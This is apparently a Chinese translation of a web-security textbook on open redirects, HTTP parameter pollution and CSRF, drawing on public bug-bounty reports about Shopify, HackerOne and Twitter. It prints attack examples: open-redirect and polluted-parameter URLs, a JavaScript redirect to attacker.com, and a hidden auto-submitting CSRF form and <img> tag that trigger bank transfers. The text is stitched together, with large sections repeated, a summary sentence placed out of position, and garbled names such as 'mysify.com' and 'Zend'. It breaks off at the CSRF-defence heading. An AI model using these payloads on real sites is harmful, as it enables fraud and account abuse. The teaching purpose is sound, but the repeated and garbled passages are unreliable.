http://mystore.myshopify.com/account/login?checkout_url=attacker.com
```

他们会被重定向到 URL `http://mystore.myshopify.com.<attacker>.com/`，这并不是 Shopify 的域名。

由于 URL 以 `<attacker>.com` 结尾，且 DNS 查找使用最右的域名标签，重定向将指向 `<attacker>.com` 域名。因此，当提交 `http://mystore.myshopify.com.<attacker>.com/` 进行 DNS 查询时，它将匹配 `<attacker>.com`（Shopify 并不拥有），而不是 Shopify 预期的 `myshopify.com`。虽然攻击者无法自由地将目标发送到任何地方，但他们可以通过在可以操纵的值中添加特殊字符（如句号），将用户发送到另一个域名。

### 启示

如果你只能控制网站使用的最终 URL 的部分，添加特殊的 URL 字符可能会更改 URL 的含义，并将用户重定向到另一个域名。假设你只能控制 `checkout_url` 参数的值，而且你还注意到该参数在网站后端与一个硬编码的 URL 结合，例如商店 URL `http://mystore.myshopify.com/`。可以通过添加特殊的 URL 字符（如句号或 `@` 符号）来测试你是否可以控制重定向的位置。

## HackerOne 中间页重定向

**难度**：低

**URL**：不适用 (N/A)

**来源**：https://www.hackerone.com/reports/111968/

**报告日期**：2016年1月20日

**赏金**：$500

某些网站尝试通过实现中间页网页来防止开放重定向漏洞，这些页面会在预期内容之前显示。每当你将用户重定向到某个 URL 时，你都可以显示一个中间网页，并用消息向用户解释他们正在离开当前所在的域名。结果，如果重定向页面显示虚假的登录或尝试伪装成信赖域名，用户就会知道他们正在被重定向。这是 HackerOne 在跳转到站外的大多数 URL 时采取的方法；例如，在处理提交的报告中的链接时。

尽管你可以使用中间网页来避免重定向漏洞，但网站之间交互方式的复杂性可能导致链接损坏。HackerOne 使用 Zendesk（一个客户服务工单系统）作为 `https://support.hackerone.com/` 子域名。此前，当你访问 `hackerone.com/zendesk_session` 时，浏览器会直接从 HackerOne 平台重定向到 HackerOne 的 Zendesk 平台，而没有中间页，因为包含 `hackerone.com` 域名的 URL 被视为受信任链接。（HackerOne 现在会将 `https://support.hackerone.com` 重定向到 `docs.hackerone.com`，除非你通过 URL `/hc/en-us/requests/new` 提交支持请求）。然而，任何人都可以创建自定义 Zendesk 账户并将它们传递给 `/redirect_to_account?state=parameter`。自定义 Zendesk 账户随后可以重定向到另一个不属于 Zendesk 或 HackerOne 的其他网站。由于 Zendesk 允许在账户之间进行重定向而无需中间页，用户可能会在毫无警告的情况下被带到不受信站点。作为解决方案，HackerOne 将包含 `zendesk_session` 的链接识别为外部链接，点击时会渲染中间警告页。

为了确认此漏洞，黑客 Mahmoud Jamal 在子域名 `http://compayn.zendesk.com` 下的 Zendesk 上创建了一个账户。他随后使用 Zendesk 主题编辑器在头部文件中添加了以下 JavaScript 代码，这允许管理员自定义其 Zendesk 站点：

```javascript
window.location.href = "http://attacker.com";
```



该功能将用于将用户重定向到特定商店的特定页面。然而，攻击者仍然可以通过添加字符来更改 URL 的含义，操纵这些 URL，从而将浏览器从 Shopify 的子域名重定向到攻击者的网站。

在这一漏洞案例中，在用户登录 Shopify 后，Shopify 使用 `checkout_url` 参数来重定向用户。例如，假设目标用户访问了以下 URL：

```
http://mystore.myshopify.com/account/login?checkout_url=attacker.com
```

他们会被重定向到 URL `http://mystore.myshopify.com.<attacker>.com/`，这并不是 Shopify 的域名。

由于 URL 以 `<attacker>.com` 结尾，且 DNS 查找使用最右的域名标签，重定向将指向 `<attacker>.com` 域名。因此，当提交 `http://mystore.myshopify.com.<attacker>.com/` 进行 DNS 查询时，它将匹配 `<attacker>.com`（Shopify 并不拥有），而不是 Shopify 预期的 `mysify.com`。虽然攻击者无法自由地将目标发送到任何地方，但他们可以通过在可以操纵的值中添加特殊字符（如句点），将用户发送到另一个域名。

## 启示

如果你只能控制网站使用的最终 URL 的部分，添加特殊的 URL 字符可能会更改 URL 的含义，并将用户重定向到另一个域名。假设你只能控制 `checkout_url` 参数的值，而且你还注意到该参数在网站后端与一个硬编码的 URL 结合，例如商店 URL `http://mystore.myshopify.com/`。可以通过添加特殊的 URL 字符（如句号或 `@` 符号）来测试你是否可以控制重定向的位置。

## HACKERONE 中间页重定向

- **难度：** 低
- **URL：** 不适用 (N/A)
- **来源：** https://www.hackerone.com/reports/111968/
- **报告日期：** 2016年1月20日
- **赏金：** $500

某些网站尝试通过实现中间页网页来防止开放重定向漏洞，这些页面会在预期内容之前显示。每当你将用户重定向到某个 URL 时，你都可以显示一个中间网页，并用消息向用户解释他们正在离开当前所在的域名。结果，如果重定向页面显示虚假的登录或尝试伪装成信赖域名，用户就会知道他们正在被重定向。这是 HackerOne 在跳转到站外的大多数 URL 时采取的方法；例如，在处理提交的报告中的链接时。

尽管你可以使用中间网页来避免重定向漏洞，但网站之间交互方式的复杂性可能导致链接损坏。HackerOne 使用 Zendesk（一个客户服务工单系统）作为 `https://support.hackerone.com/` 子域名。此前，当你访问 `hackerone.com/zendesk_session` 时，浏览器会直接从 HackerOne 平台重定向到 HackerOne 的 Zendesk 平台，而没有中间页，因为包含 `hackerone.com` 域名的 URL 被视为受信任链接。（HackerOne 现在会将 `https://support.hackerone.com` 重定向到 `docs.hackerone.com`，除非你通过 URL `/hc/en-us/requests/new` 提交支持请求）。然而，任何人都可以创建自定义 Zend 账户并将它们传递给 `/redirect_to_account?state=parameter`。自定义 Zend 账户随后可以重定向到另一个不属于 Zend 或 HackerOne 的其他网站。由于 Zendesk 允许在账户之间进行重定向而无需中间页，用户可能会在毫无警告的情况下被带到不受信站点。作为解决方案，HackerOne 将包含 `zendesk_session` 的链接识别为外部链接，点击时会渲染中间警告页。

为了确认此漏洞，黑客 Mahmoud Jamal 在子域名 `http://compayn.zendesk.com` 下的 Zend 上创建了一个账户。他随后使用 Zendesk 主题编辑器在头部文件中添加了以下 JavaScript 代码，这允许管理员自定义其 Zend 站点。

漏洞类型，以及开发者经常犯错的地方。如你所看到的，发现 HPP 漏洞需要实验和坚持，但这些努力是值得的。

## 服务端 HPP

在服务器端 HPP 中，你向服务器发送意外的信息，试图让服务器端代码返回意外的结果。当你向网站发送请求时，网站的服务器会处理该请求并返回响应，正如第 1 节所述。在某些情况下，服务器不仅返回网页，还会根据从发送的 URL 中接收的信息运行某些代码。这些代码只在服务器上运行，因此对你来说基本上是不可见的：你可以看到你发送的信息和获得的结果，但中间的代码是不可用的。因此，你只能推断正在发生什么。由于你无法看到服务器代码如何运行，服务器端 HPP 取决于你识别潜在的漏洞参数并对其进行实验。

让我们来看一个例子：如果你的银行通过其网站接受并在服务器上处理 URL 参数来启动转账，可能会发生服务器端 HPP。假设你可以通过在三个 URL 参数 `from`、`to` 和 `amount` 中输入值来转账。每个参数按顺序指定了转出账户、转入账户和转账金额。一个带有这些参数的从账户 12345 转账到账户 67890 的 5,000 美元的 URL 可能如下所示：

```
https://www.bank.com/transfer?from=12345&to=67890&amount=5000
```

银行可能假设它只会接收一个 `from` 参数。但如果你提交了两个，如下 URL 所示，会发生什么：

```
https://www.bank.com/transfer?from=12345&to=67890&amount=5000&from=ABCDEF
```

此 URL 的结构与第一个示例相同，但附加了一个额外的 `from` 参数，指定发送另一个账户 ABCDEF。在这种情况下，攻击者会发送这个额外参数，希望应用程序使用第一个 `from` 参数验证转账，但使用第二个 `from` 参数进行扣款。因此，如果银行信任它收到的最后一个 `from` 参数，攻击者可能能够从他们并不拥有的账户执行转账。服务器端代码将不会从账户 12345 向 67890 转账 5,000 美元，而是使用第二个参数从账户 ABCDEF 向 67890 转账。

当服务器接收到多个同名的参数时，它可以以多种方式做出响应。例如，PHP 和 Apache 使用最后一次出现的，Apache Tomcat 使用第一次出现的，ASP 和 IIS 使用所有出现过的，等等。研究人员 Luca Carettoni 和 Stefano di Paolo 在 AppSec EU 09 会议上对服务器技术之间的许多差异进行了详细演示：这些信息现在可以在 OWASP 网站上的 https://www.owasp.org/images/ba/AppsecEU09_CarretoniDiPaola_v0.8.pdf 上（参见幻灯片 9）。因此，处理同名多次提交没有单一的保证流程，且发现 HPP 漏洞需要一些实验来确认网站的测试机制是如何工作的。

银行的示例使用了显而易见的参数。但有时 HPP 漏洞是由于不可直接见的代码隐藏服务器端行为而引起的。例如，假设银行决定修改处理转账的方式，并更改后端代码，不再在 URL 中包含 `from` 参数。这次，银行将采取两个参数，一个用于转入账户，另一个用于转账金额。转入账户将由服务器设置，这对你来说是不可见的。一个示例链接可能如下：

```
https://www.bank.com/transfer?to=67890&amount=5000
```

通常，服务器端代码对我们来说是一个谜团，但为了这个示例，我们知道银行（极其糟糕且冗余的）服务器端 Ruby 代码如下：



# 服务器端 HPP

在服务器端 HPP 中，你向服务器发送意外的信息，试图让服务器端代码返回意外的结果。当你向网站发送请求时，网站的服务器会处理该请求并返回响应。在某些情况下，服务器不仅返回网页，还会根据从发送的 URL 中接收的信息运行某些代码。这些代码只在服务器上运行，因此对你来说基本上是不可见的：你可以看到你发送的信息和获得的结果，但中间的代码是不可用的。因此，你只能推断正在发生什么。由于你无法看到服务器代码如何运行，服务器端 HPP 取决于你识别潜在的漏洞参数并对其进行实验。

## 银行转账示例

让我们来看一个例子：如果你的银行通过其网站接受并在服务器上处理 URL 参数来启动转账，可能会发生服务器端 HPP。假设你可以通过在三个 URL 参数 `from`、`to` 和 `amount` 中输入值来转账。每个参数按顺序指定了转出账户、转入账户和转账金额。一个带有这些参数的从账户 `12345` 转账到账户 `67890` 的 `5,000` 美元的 URL 可能如下所示：

```
https://www.bank.com/transfer?from=12345&to=67890&amount=5000
```

银行可能假设它只会接收一个 `from` 参数。但如果你提交了两个，如下 URL 所示，会发生什么：

```
https://www.bank.com/transfer?from=12345&to=67890&amount=5000&from=ABCDEF
```

此 URL 的结构与第一个示例相同，但附加了一个额外的 `from` 参数，指定发送另一个账户 `ABCDEF`。在这种情况下，攻击者会发送这个额外参数，希望应用程序使用第一个 `from` 参数验证转账，但使用第二个 `from` 参数进行扣款。因此，如果银行信任它收到的最后一个 `from` 参数，攻击者可能能够从他们并不拥有的账户执行转账。服务器端代码将不会从账户 `12345` 向 `67890` 转账 `5,000` 美元，而是使用第二个参数从账户 `ABCDEF` 向 `67890` 转账。

当服务器接收到多个同名的参数时，它可以以多种方式做出响应。例如，`PHP` 和 `Apache` 使用最后一次出现的，`Apache Tomcat` 使用第一次出现的，`ASP` 和 `IIS` 使用所有出现过的，等等。研究人员 `Luca Carettoni` 和 `Stefano di Paolo` 在 `AppSec EU 09` 会议上对服务器技术之间的许多差异进行了详细演示：这些信息现在可以在 `OWASP` 网站上的 `https://www.owasp.org/images/ba/AppsecEU09_CarretoniDiPaola_v0.8.pdf` 上（参见幻灯片 9）。因此，处理同名多次提交没有单一的保证流程，且发现 HPP 漏洞需要一些实验来确认网站的测试机制是如何工作的。

## 隐藏的服务器端行为

银行的示例使用了显而易见的参数。但有时 HPP 漏洞是由于不可直接见的代码隐藏服务器端行为而引起的。例如，假设银行决定修改处理转账的方式，并更改后端代码，不再在 URL 中包含 `from` 参数。这次，银行将采取两个参数，一个用于转入账户，另一个用于转账金额。转入账户将由服务器设置，这对你来说是不可见的。一个示例链接可能是：

```
https://www.bank.com/transfer?to=67890&amount=5000
```

通常，服务器端代码对我们来说是一个谜团，但为了这个示例，我们知道银行（极其糟糕且冗余的）服务器端 Ruby 代码如下：

```
user.account = 12345
def prepare_transfer(params)
  params << user.account
  transfer_money(params) #user.account (12345) becomes params[2]
end

def transfer_money(params)
  to = params[0]
  amount = params[1]
  from = params[2]
  transfer(to,amount,from)
end
```

这段代码创建了两个函数 `prepare_transfer` 和 `transfer_money`。`prepare_transfer` 函数接收一个名为 `params` 的数组 ①，它包含了 URL 中的 `to` 和 `amount` 参数。数组将是 `[67890,5000]`，其中数组值位于括号之间，每个值由逗号分隔。函数的的第一行 ② 将代码早早定义的用户账户信息添加到数组的末尾。我们最终在 `params` 中得到数组 `[67890,5000,12345]`，然后 `params` 被传递给 `transfer_money`。③ 注意，与参数不同，数组的值没有关联名称，因此代码依赖于数组始终按顺序包含每个值：转入账户、转账金额和 `from` 参数。

# 客户端 HPP

客户端 HPP 漏洞允许攻击者向 URL 注入额外参数，从而在你的计算机上产生效果（通常通过浏览器），而不是在网站的服务器上。

`Luca Caretoni` 和 `Stefano di Paolo` 在他们的演示中包含了这种行为的示例，使用了理论上的 URL `http://host/page.php` 和以下服务器端代码：

```
<?php $val=htmlspecialchars($_GET['par'],ENT_QUOTES); ?>
<a href="page.php?action=view&par=<?php=$val;?>">View Me!</a>
```

这段代码根据 `par`（一个用户输入的参数）的值生成一个新的 URL。在这个示例中，攻击者将 `123%26action=edit` 作为 `par` 的值传递，以生成额外的参数。`&` 的 URL 编码值为 `%26`，这意味着当解析 URL 时，`%26` 被解释为 `&`。这在不显式让 `action` 参数出现在 URL 的情况下，为生成的 `href` 增加了一个额外的参数。如果参数使用的是 `123&action=edit` 而不是 `%26`，那么 `&` 将被解释为分隔不同的参数，但由于网站仅在代码中使用该参数，`action` 参数将被丢弃。`%26` 值绕过了这一点，确保了 `action` 起初不会被识别为单独参数，因此 `123%26action=edit` 变成了 `par` 的值。

接下来，`par`（编码后的 `&` 为 `%26`）被传递给函数 `htmlspecialchars` ❶。`htmlspecialchars` 函数将特殊字符（例如 `%26`）转换为 HTML 编码值，将 `%26` 转换为 `&amp;`（在 HTML 中表示 `&` 的 HTML 实体），该字符可能具有特殊含义。转换后的值存储在 `$val` 中。然后通过将 `$val` 附加到 `href` 值处 ② 生成新链接。因此，生成的链接变为 `href="/page.php?action=view&par=123&amp;action=edit">`。结果，攻击者成功地在 `href` URL 中添加了额外的 `action=edit`，取决于应用程序如何处理走私的 `action` 参数，这可能导致漏洞。

以下三个示例详细说明了在 `HackerOne` 和 `Twitter` 上发现的客户端和服务器端 HPP（HTTP 参数污染）漏洞。所有这些示例都涉及 URL 参数篡改。然而，你应该注意，没有两个示例是使用相同方法发现的，也没有共享相同的根源，这进一步强调了在寻找 HPP 漏洞时进行彻底测试的重要性。

# HACKERONE 社交分享按钮

**难度：** 低

**URL：** `https://hackerone.com/blog/introducing-signal-and-impact/`

**数据来源：** `https://hackerone.com/reports/105953/`

**报告日期：** 2015年12月18日

**赏金金额：** $500

发现 HPP 漏洞的一种方法是寻找那些似乎连接到其他服务的链接。`HackerOne` 的博客文章通过包含用于在 `Twitter`、`Facebook` 等热门社交媒体网站上分享内容的链接来实现这一点。当用户点击这些链接时，`HackerOne` 会生成供用户在社交媒体上发布的内容。发布的内容包含指向原始博客文章的 URL 引用。

一名黑客发现了一个漏洞，允许你向 `HackerOne` 博客文章的 URL 添加一个参数。添加的 URL 参数将反映在共享的社交媒体链接中，导致生成的社交媒体内容链接到预期 `HackerOne` 博客 URL 以外的地方。

漏洞报告中使用的示例涉及访问 URL `https://hackerone.com/blog/introducing-signal` 并在其末尾添加了 `&u=https://vk.com/durov`。在博客页面上，当 `HackerOne` 渲染一个用于分享到 `Facebook` 的链接时，该链接将变为如下：

```
https://www.facebook.com/sharer.php?u=https://hackerone.com/blog/introducing-signal?&u=https://vk.com/durov
```

如果 `HackerOne` 的访问者在尝试分享内容时点击此恶意更新的链接，`u` 参数将优先于第一个 `u` 参数。随后，`Facebook` 帖子将使用最后一个 `u` 参数。然后，点击链接的 `Facebook` 用户将被重定向到 `https://vk.com/durov` 而不是 `HackerOne`。

此外，在发布到 `Twitter` 时，`HackerOne` 会包含用于推广推文的默认文本。攻击者还可以通过在 URL 中包含 `&text=` 来操纵这些文本，

```
https://hackerone.com/blog/introducing-signal?&u=https://vk.com/durov&text=another_site:https://vk.com/durov
```

当用户点击此链接时，他们将得到一个包含“another_site: https://vk.com/durov”文本的推文弹出，而不是推广 `HackerOne` 博客的文本。

## 总结

当网站接受内容、似乎连接到另一个网络服务（如社交媒体网站）并依赖当前 URL 生成要发布的内容时，要留心漏洞机会。

在这些情况下，提交的内容可能在没有经过适当安全检查的情况下被传递，这可能导致参数污染漏洞。

# TWITTER 取消订阅通知

**难度：** 低

**URL：** `https://www.twitter.com/`

**来源：** `https://blog.mert.ninja/twitter-hpp-vulnerability/`

**报告日期：** 2015年8月23日

**赏金金额：** $700

在某些情况下，成功发现 HPP 漏洞需要坚持。2015年8月，黑客 `Mert Tasci` 在取消接收 `Twitter` 通知时注意到一个有趣的 URL（我在此对其进行了缩短）：

```
https://twitter.com/i/u/
id=F6542uid=1134885524&nid=22+26&sig=647192e86e28fb6
691db2502c5effc3
```

注意参数 `UID`。这个 `UID` 恰好是当前登录账户的用户 ID。在注意到 `UID` 后，`Tasci` 采取了大多数黑客会做的事——他尝试将 `UID` 改为另一个用户的 `UID`，但什么都没有发生。`Twitter` 只是返回了一个错误。

`Tasci` 决定在别人可能放弃时继续，他添加了第二个 `UID` 参数，使得 URL 看起来像这样（再次是缩短版）：

```
https://twitter.com/i/u/?id=F6542&uid=232101342&uid=1134885524&nid=22&26&sig=647192e86e28fb6691db2502c5e6cf3xxx
```

成功了！他成功取消了另一个用户的邮件通知订阅。`Twitter` 受到 HPP 取消订阅的影响。该漏洞值得关注的原因（正如 `FileDescriptor` 向我解释的那样）与 `SIG` 参数有关。事实是 `Twitter` 使用 `UID` 值生成 `SIG` 值。当用户点击取消 URL 时，`Twitter` 会通过检查 `SIG` 和 `UID` 值来验证 URL 是否被篡改。因此，在 `Tasci` 的初始测试中，更改 `UID` 来取消另一个用户失败了，因为签名不再匹配 `Twitter` 预期的值。然而，通过添加第二个 `UID`，`Tasci` 成功地让 `Twitter` 使用第一个 `UID` 参数验证签名，但使用第二个 `UID` 参数执行取消订阅操作。

## 总结

漏洞类型，以及开发者经常犯错的地方。如你所看到的，发现 HPP 漏洞需要实验和坚持，但这些努力是值得的。



Tasci 的努力证明了坚持和知识的重要性。如果他在将 `UID` 改为另一个用户并失败后就放弃该漏洞，或者他并不知道 HPP 类型漏洞，他就不会获得那 700 美元的赏金了。

此外，注意 HTTP 请求中包含的自动递增整数参数（如 `UID`）：许多漏洞涉及操纵此类值以产生意料之外的行为。

## TWITTER WEB INTENTS

- **难度：** 低
- **URL：** https://twitter.com/~tampering
- **来源：** https://ericaloff.com/parameter-tampering-on-twitter-intents/
- **报告日期：** 2015年11月
- **赏金金额：** 未公开

在某些情况下，HPP 漏洞可能指示其他问题。Twitter Intents 功能允许用户在不离开页面的情况下与 Twitter 内容交互。图 1 显示了这些弹出窗口的一个示例。

![](img/0e0c482eb94b49528b39) 图 3-1：Twitter Intents 功能的早期版本，允许用户在不离开页面的情况下进行交互。在这个示例中，用户可以点赞 Jack 的推文。

测试此功能时，黑客 Eric Rafaloff 发现所有意图类型——关注用户、点赞推文、转发和发推——都受到 HPP 的影响。Twitter 会通过 GET 请求创建每个意图，参数如下：

```
https://twitter.com/intentType?parameter_name=pValue
```

此 URL 将包含 `intentType` 和一个或多个参数键值对——例如用户名和推文 ID。Twitter 将使用这些参数创建显示关注用户或点赞推文的弹出意图。Rafaloff 为关注意图创建一个包含两个 `screen_name` 参数而非预期的单一 `screen_name` 时发现了一个问题：

https://twitter.com/intent?screen_name=twitter&screen_name=erictest3

Twitter 在处理请求时会赋予第二个 `screen_name` 值 `erictest3` 优先级，而不是第一个 `twitter` 值，从而生成关注按钮。因此，尝试关注 Twitter 官方账户的用户可能会误导关注 Rafaloff 的测试账户。访问 Rafaloff 创建的 URL 将导致 Twitter 的后端代码使用那两个 `screen_name` 参数生成如下 HTML 表单：

```
<form class="follow" id="btn_form" action="/intent/follow?screen_name=erictest3" method="post">
<input type="hidden" name="authenticity_token" value="...">
<input type="hidden" name="screen_name" value="twitter">
<input type="hidden" name="profile_id" value="783214">
<button class="button" type="submit">
<strong>Follow</strong></button>
</form>
```

Twitter 将使用来自第一个 `screen_name` 参数的信息，该参数与 Twitter 官方账户关联。结果，目标将看到想要关注的正确个人资料，因为 URL 的第一个 `screen_name` 参数被用于填充代码 2 和 3 处。但是，在点击按钮后，目标将关注 `erictest3`，因为表单标签中的 `action` 却会使用第二个 `screen_name` 参数的值 `1` 被传递到了原始 URL 中。

同样，在展示点赞意图（intents）时，Rafadoff 发现他可以包含 `screen_name` 参数，尽管它与点赞推文无关。例如，他可以创建这个 URL：

https://twitter.com/intent/like?tweet_id=6616252302978211845&screen_name=ericristest3

正常的点赞意图只需要 `tweet_id` 参数；然而，Rafadoff 将 `screen_name` 参数注入到 URL 的末尾。点赞这条推文将导致目标看到正确的推文者个人资料以进行点赞。正确推文旁边的“关注”按钮以及推文者的正确个人资料将针对该无关的用户 `ericristest`。

## 核心点总结 (Takeaways)

Twitter Web Intents 漏洞与之前的 UID Twitter 漏洞类似。意料之中的是，当一个网站受到 HPP（HTTP 参数污染）漏洞的影响时，这可能表明存在更广泛的系统性问题。有时，当你发现此类漏洞时，值得花时间探索整个平台，看看是否还有其他区域可以利用类似的行为。

## 总结 (SUMMARY)

HPP 带来的风险取决于网站后端执行的操作以及被污染参数被使用的位置。

发现 HPP 漏洞需要彻底的测试，比某些其他漏洞更需要如此，因为我们通常无法在接收到 HTTP 请求后访问运行代码的服务器。这意味着我们只能推断网站如何处理我们传递给它们的参数。

通过反复尝试，你可能会发现发生 HPP 漏洞的情况。通常情况下，社交媒体链接是测试此类类型漏洞的好 Test起点，但请记住，在测试参数替换（如类 ID 的值）时，要继续挖掘并考虑到 HPP 的可能。

## 4 跨站请求伪造 (4 CROSS-SITE REQUEST FORGERY)

![img/0e0c482eb94dba4b95528b396562dd10_83_0.png)

跨站请求伪造（CSRF）攻击发生在攻击者可以使目标向另一个网站发送 HTTP 请求时。该网站随后会执行某操作，就像该请求是有效的并由目标发送的一样。此类攻击通常依赖于目标之前在漏洞网站上经过身份验证，而该操作是在目标不知情的情况下提交的。当 CSRF 攻击成功时，攻击者能够修改服务器端信息，甚至可能接管用户的账户。这是一个基础示例，我们稍后将介绍：

1. Bob 登录他的银行网站检查余额。
2. 完成后，Bob 在另一个域名的站点检查他的邮箱账户。
3. Bob 收到一封邮件，其中包含指向陌生网站的链接，他点击该链接查看指向何处。
4. 加载时，陌生网站指示 Bob 的浏览器向 Bob 的银行网站发送 HTTP 请求，请求从他的账户转账到攻击者的账户。
5. Bob 的银行网站收到了从陌生（恶意）网站发起的 HTTP 请求。但由于银行网站没有任何任何 CSRF 保护，它处理了这笔交易。

## 身份验证 (AUTHENTICATION)

CSRF 攻击（如我刚才描述的那样）利用了网站用于身份验证请求的缺陷。当你访问一个需要登录的网站（通常使用用户名和密码）时，该网站通常会对你进行身份验证。然后，网站会将该身份验证存储在你的浏览器中，这样你每次访问该网站的新页面时都无需重新登录。它可以通过两种方式存储身份验证：使用基础认证协议（basic authentication protocol）或 Cookie。

当 HTTP 请求包含类似这样的标头时：`Authorization: Basic QXvUa2VZyYW11`，你可以识别出使用基础授权的网站。这段看起来随机的字符串是经过 Base64 编码的用户名和密码，用冒号分隔。在这种情况下，`QWxhZGRbpjppcCGvUa2VZyYW11` 解码为 `Aladdin:OpenSesame`。我们将在本章中不会重点讨论身份验证，但你可以使用这里涵盖的许多技术来利用你使用基础认证的 CSRF 漏洞。

Cookie 是网站创建并存储在用户浏览器中的小型文件。网站使用 Cookie 有各种用途，例如存储用户偏好或用户访问网站的历史等信息。Cookie 具有某些属性，即标准化的信息。这些细节告诉浏览器有关 Cookie 的属性以及如何处理它们。某些 Cookie 属性可能包括 `domain`、`expires`、`max-age`、`secure` 和 `httponly`，你将在本章稍后学习这些。除了属性外，Cookie 还可以包含一个键值对，它由一个标识符和一个传递给网站的关联值组成（Cookie 的 `domain` 属性定义了传递此信息的站点）。

浏览器定义了一个站点可以设置的 Cookie 数量。但通常，在常用浏览器中，站点可以设置 50 到 150 个 Cookie，据报道某些支持超过 600 个。浏览器通常允许每个 Cookie 最多使用 4KB。Cookie 的名称或值没有标准：网站可以自由选择自己的键值对和用途。例如，网站可以使用名为 `sessionid` 的 Cookie 来记住用户是谁，而不是让他们在访问每个页面或执行每项操作时都输入用户名和密码。（回想第 1 章描述的 HTTP 请求是无状态的，无状态意味着对于每个 HTTP 请求，网站不会

总结一下，如果 Bob 访问的银行网站使用 Cookie，该站点将按照以下过程存储他的身份验证。一旦 Bob 访问站点并登录，银行将对其 HTTP 请求做出 HTTP 响应，其中包含一个识别 Bob 的 Cookie。随后，Bob 的浏览器将在向银行网站发送的所有其他 HTTP 请求中携带该 Cookie。

在完成银行操作后，Bob 离开银行网站时并没有注销。注意这个细节，因为当你注销站点时，该站点通常会响应一个使 Cookie 过期的 HTTP 响应。结果是当你再次访问站点时，必须重新登录。

当 Bob 检查邮件并点击链接访问未知站点时，他无意访问了恶意网站。该网站的设计目的是指示 Bob 的浏览器向他的银行网站发送请求以执行 CSRF 攻击。此请求还会发送浏览器中的 Cookie。

## GET 请求 CSRF (CSRF WITH GET REQUESTS)

恶意网站利用 Bob 银行网站取决于银行是否接受通过 GET 或 POST 请求进行转账。如果 Bob 的银行网站接受通过 GET 请求传输，恶意网站将通过隐藏表单或 `<img>` 标签发送 HTTP 请求。GET 和 POST 方法都依赖于 HTML 来让浏览器发送所需的 HTTP 请求，两种方法都可以使用隐藏表单技术，但只有 GET 方法可以使用 `<img>` 标签技术。在本节中，我们将查看在使用 GET 请求方法时通过 HTML `<img>` 标签技术的攻击是如何工作的，并在下一节“带 POST 请求的 CSRF”中查看隐藏表单技术。

攻击者需要将 Bob 的 Cookie 包含在任何发往 Bob 银行网站的转账 HTTP 请求中。但由于该攻击者无法读取 Bob 的 cookies，攻击者不能简单地创建一个 HTTP 请求并发送到银行网站。相反，攻击者可以使用 HTML `<img>` 标签创建一个同样包含 Bob cookies 的 GET 请求。`<img>` 标签用于在网页上渲染图像，并包含一个 `src` 属性，该属性告诉浏览器在何处定位图像文件。当浏览器渲染 `<img>` 标签时，它会对标签中的 `src` 属性发送一个 HTTP GET 请求，并在该请求中包含任何现 cookie。因此，假设恶意网站使用类似下面的 URL，从 Bob 处转移 500 美元给 Joe：

```
https://www.bank.com/transfer?from=bob&to=joe&amount=500
```

那么，恶意的 `<img>` 标签将使用此 URL 作为其源值，如下所示：

```
<img src="https://www.bank.com/transfer?from=bob&to=joe&amount=500">
```

结果，当 Bob 访问攻击者拥有的网站时，网站会在 HTTP 响应中包含该 `<img>` 标签，随后浏览器向银行发送 HTTP GET 请求。浏览器发送 Bob 的身份验证 cookies 以获取它认为应该是图像的内容。事实上，银行收到了请求，处理了标签 `src` 属性中的 URL，并创建了转账请求。

为了避免这种漏洞，开发者永远不要使用 HTTP GET 请求来执行任何后端数据修改请求（例如转账）。但任何只读的请求应该是安全的。许多用于构建网站的常用 Web 框架（如 Ruby on Rails、Django 等）都会期望开发者遵循这一原则，因此它们会自动为 POST 请求添加 CSRF 保护，但不对 GET 请求添加。

## 使用 POST 请求的 CSRF

如果银行通过 POST 请求执行转账，你需要使用不同的方法来创建 CSRF 攻击。攻击者无法使用 `<img>` 标签，因为 `<img>` 标签无法调用 POST 请求。相反，攻击者的策略将取决于 POST 请求的内容。

最简单的情况涉及一个 content-type 为 `application/x-www-form-urlencoded` 或 `text/plain` 的 POST 请求。`content-type` 是浏览器在发送 HTTP 请求时可能包含的头部。该头部告诉接收者 HTTP 请求体是如何编码的。这是一个 `text/plain` content-type 请求的示例：

```
POST / HTTP/1.1
Host: www.google.ca
User-Agent: Mozilla/5.0 (Windows NT 6.1; rv:50.0) Gecko/2010101
Firefox/50.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*q=0.8
Content-Length: 5
Content-Type: text/plain;charset=UTF-8
DNT: 1
Connection: close
hello
```

`content-type` 被标记出来，其类型列出了请求的字符编码。`content-type` 非常重要，因为浏览器对不同类型的处理方式不同（我稍后会提到）。

在这种情况下，恶意网站可能会创建一个隐藏的 HTML 表单，并在目标不知情的情况下静默提交到受漏洞的网站。表单可以向 URL 提交 POST 或 GET 请求，甚至可以提交参数值。以下是恶意链接引导 Bob 进入的网站中的某些有害代码：

```html
<iframe style="display:none" name="csrf-frame"></iframe>
<form method="POST" action="http://bank.com/transfer" target="csrf-frame" id="csrf-form">
<input type="hidden" name="from" value="Bob">
<input type="hidden" name="to" value="Joe">
<input type="hidden" name="amount" value="500">
<input type="submit" value="submit">
</form>
<script>document.getElementById("csrf-form").submit();</script>
```

在这里，我们通过一个表单向 Bob 的银行发送 HTTP POST 请求（表单由 `<form>` 标签中的 `action` 属性指定）。因为攻击者不希望 Bob 看到表单，因此每个 `<input>` 元素都被赋予了类型 'hidden$，这使得它们在 Bob 看到的网页上是不可见的。最后一步，攻击者在 `<script>` 标签内部包含了一些 JavaScript，以便在页面加载时自动提交表单。4. JavaScript 通过在 HTML 文档上调用 `getElementById()` 方法来实现，并将我们在第二行中设置的表单 ID ("csrf-form") 作为参数。与 GET 请求一样，一旦表单提交，浏览器就会发起 HTTP POST 请求将 Bob 的 cookies 发送到银行网站，从而触发转账。因为 POST 请求会向浏览器返回 HTTP 响应，攻击者使用 `display:none` 属性在 iFrame 中隐藏了响应。结果，Bob 并没有看到它，也没有意识到发生了什么。

在其他场景中，网站可能会期望以 content-type `application/json` 提交 POST 请求。在某些情况下，`application/json` 类型的请求将有一个 CSRF 令牌。该令牌是随 HTTP 请求提交的值，以便合法网站可以验证请求源自自身，而不是来自另一个恶意网站。有时 POST 请求的 HTTP 体包含该令牌。有时 POST 请求的 HTTP 体包含令牌，但其他时候它可能是一个如 `X-CSRF-TOKEN` 的自定义头部。这很重要，因为它允许服务器区分合法请求和恶意请求。如果实现正确，它可以防止攻击者代表用户执行操作。

## 防御 CSRF 攻击

